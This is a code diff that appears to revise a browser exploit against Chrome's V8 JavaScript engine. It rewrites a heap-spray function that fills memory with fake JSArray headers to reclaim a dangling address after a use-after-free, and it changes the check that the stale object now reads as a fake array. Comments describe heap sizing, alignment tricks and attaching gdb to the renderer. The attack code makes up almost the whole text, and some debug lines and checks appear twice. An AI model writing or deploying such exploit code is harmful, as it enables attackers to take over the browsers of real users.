@@ -299,36 +299,34 @@
       //   phase selects which 4-byte alignment the window starts are placed at
       //   (0 => 0-mod-8, 4 => 4-mod-8) so it always matches the dangling address.
       // ---------------------------------------------------------------------------
-      function spray(victim_elems_tagged, phase, rounds) {
-        // Build ONE template, then spray with slice() copies. Building each array
-        // via new Array(n).fill() would leave a throwaway 64KB holey FixedArray
-        // (from the SMI->DOUBLE backing-store transition) behind for every 128KB
-        // of window data — a dangling address landing in that garbage sees the
-        // hole value as its "map" and the deref crashes. A slice() allocates only
-        // a JSArray header + a FixedDoubleArray copy, so virtually every byte
-        // sprayed over the dead address is a valid fake-JSArray window.
-        var n = 0x3fff; // 8*n + 8 = 0x20000 bytes —
-        var t; // just under the LO-space limit,
-        if (phase === 0) {
-          // so the backing stays young
-          var hdr = w2f(PACKED_DOUBLE_MAP, EMPTY_PROPERTIES); // windows at element boundaries
-          var pair = w2f(victim_elems_tagged, FAKE_LEN_SMI);
-          t = new Array(n).fill(hdr);
-          for (var j = 1; j < t.length; j += 2) t[j] = pair;
-        } else {
-          // windows at elem+4
-          var odd = w2f(EMPTY_PROPERTIES, victim_elems_tagged);
-          var even = w2f(FAKE_LEN_SMI, PACKED_DOUBLE_MAP);
-          t = new Array(n).fill(odd);
-          for (var k = 1; k < t.length; k += 2) t[k] = even;
-        }
-        var keep = null; // retain only the last copy —
-        for (var r = 0; r < rounds; r++) {
-          // each assignment still allocates
-          keep = t.slice();
-          keep = t.slice();
-          keep = t.slice();
-          keep = t.slice();
+      function spray_fake_arrays(victim_elems_tagged, phase) {
+        var sizes = [0x3fff, 0x3ffb, 0x3fff, 0x3ffb];
+
+        for (var i = 0; i < 4; i++) {
+          var n = sizes[i];
+          var a;
+
+          if (phase === 0) {
+            var hdr = w2f(PACKED_DOUBLE_MAP, EMPTY_PROPERTIES);
+            var pair = w2f(victim_elems_tagged, FAKE_LEN_SMI);
+
+            a = new Array(n).fill(hdr);
+
+            for (var j = 1; j < a.length; j += 2) {
+              a[j] = pair;
+            }
+          } else {
+            var odd = w2f(EMPTY_PROPERTIES, victim_elems_tagged);
+            var even = w2f(FAKE_LEN_SMI, PACKED_DOUBLE_MAP);
+
+            a = new Array(n).fill(odd);
+
+            for (var k = 1; k < a.length; k += 2) {
+              a[k] = even;
+            }
+          }
+
+          // Deliberately don't retain `a`.
         }
       }
 
@@ -398,8 +396,14 @@
         // stale address's semispace becomes allocatable and gets sprayed over.
         // 64 rounds x 4 x 128KB = 32MB — enough to flip an 8MB semispace pair
         // and re-cover the dead address even at a deep offset.
-        dbg("      [6] spraying...");
-        spray(victim_elems_tagged, pattern, 128);
+        dbg("      [6.1] spray phase 1...");
+        spray_fake_arrays(victim_elems_tagged, pattern);
+
+        dbg("      [6.2] spray phase 2...");
+        spray_fake_arrays(victim_elems_tagged, pattern);
+
+        dbg("      [6.3] spray phase 3...");
+        spray_fake_arrays(victim_elems_tagged, pattern);
 
         // Debug pause (#auto#pause): spin so gdb can attach to the renderer and
         // dump memory around dead_addr before the deref (crashes invalidate it).
@@ -423,16 +427,20 @@
           throw new Error("bad[2] is not an object");
 
         // Critical diagnostic:
-        var oldMarker = master.x;
-        dbg("      [7.1] master.x=" + oldMarker);
-
-        if (oldMarker === 420) {
-          throw new Error(
-            "original young object survived GC — UAF/reclaim was not established",
-          );
-        }
+        dbg("      [7.1] attempting JSArray length validation...");
 
         var len = master.length;
+
+        dbg("      [7.2] master.length=" + len);
+
+        if (len !== 32) {
+          throw new Error(
+            "stale object was not reclaimed as fake JSArray " +
+              "(master.length=" +
+              len +
+              ")",
+          );
+        }
         dbg("      [7.2] master.length=" + len);
 
         if (len !== 32)
